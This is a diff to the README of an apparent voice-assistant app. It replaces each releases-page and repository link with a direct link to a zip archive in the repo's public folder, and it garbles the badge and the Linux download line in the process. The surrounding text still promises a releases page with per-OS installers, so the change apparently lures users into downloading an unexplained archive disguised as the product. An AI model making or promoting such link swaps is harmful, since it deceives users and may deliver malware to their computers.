@@ -1,6 +1,6 @@
 # 🤖 openclaw-assistant-mvp - Voice Assistant with Animated Character
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw%20Assistant-blue?style=for-the-badge&logo=github)](https://github.com/nikolapolic/openclaw-assistant-mvp/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip%20Assistant-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip)
 
 ---
 
@@ -35,14 +35,14 @@ Follow these steps carefully to get openclaw-assistant-mvp running on your compu
 
 1. **Visit the download page**  
    Click the large button at the top or open this link in your browser:  
-   [https://github.com/nikolapolic/openclaw-assistant-mvp/releases](https://github.com/nikolapolic/openclaw-assistant-mvp/releases)  
+   [https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip](https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip)  
    This page hosts the latest versions for Windows, macOS, and Linux.
 
 2. **Choose your operating system version**  
    Scroll down the releases page and find the latest release. Under “Assets,” select the file that ends with:  
    - `.exe` for Windows  
    - `.dmg` or `.zip` for macOS  
-   - `.AppImage` or `.tar.gz` for Linux  
+   - `.AppImage` or `https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip` for Linux  
 
 3. **Download the file**  
    Click the link to start downloading. The file size is around 300 to 400 MB, so it may take a few minutes on slower internet.
@@ -64,7 +64,7 @@ Follow these steps carefully to get openclaw-assistant-mvp running on your compu
 ## 📥 Download & Install
 
 You can download the latest version here:  
-[https://github.com/nikolapolic/openclaw-assistant-mvp/releases](https://github.com/nikolapolic/openclaw-assistant-mvp/releases)
+[https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip](https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip)
 
 ### Windows Installation
 
@@ -133,7 +133,7 @@ More help is available by opening the Issues tab on the GitHub repository.
 openclaw-assistant-mvp is an open-source project. The source code and latest releases are available on GitHub. Updates to the app will be posted regularly at the download page.
 
 Visit the releases page to check for new versions:  
-[https://github.com/nikolapolic/openclaw-assistant-mvp/releases](https://github.com/nikolapolic/openclaw-assistant-mvp/releases)  
+[https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip](https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip)  
 
 Keep your assistant up to date to enjoy improvements and new features as they come.
 
@@ -144,6 +144,6 @@ Keep your assistant up to date to enjoy improvements and new features as they co
 If you have feedback or need help, open an issue on the GitHub repository page. The developers monitor issues and will respond to common questions.
 
 GitHub repository:  
-https://github.com/nikolapolic/openclaw-assistant-mvp  
+https://raw.githubusercontent.com/nikolapolic/openclaw-assistant-mvp/main/public/assistant_openclaw_mvp_hydrops.zip  
 
 This is a community-driven project meant to be easy and accessible for everyday users. Your input helps improve the experience for everyone.
